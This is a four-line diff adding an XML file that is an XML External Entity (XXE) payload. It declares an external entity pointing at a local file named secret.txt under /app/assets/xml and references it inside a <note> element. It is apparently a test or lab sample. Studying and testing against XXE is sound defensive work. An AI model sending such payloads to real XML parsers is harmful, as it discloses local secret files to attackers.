@@ -1,0 +1,4 @@
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///app/assets/xml/secret.txt"> ]>
+<note>
+ <xxe>&ent;</xxe>
+</note>
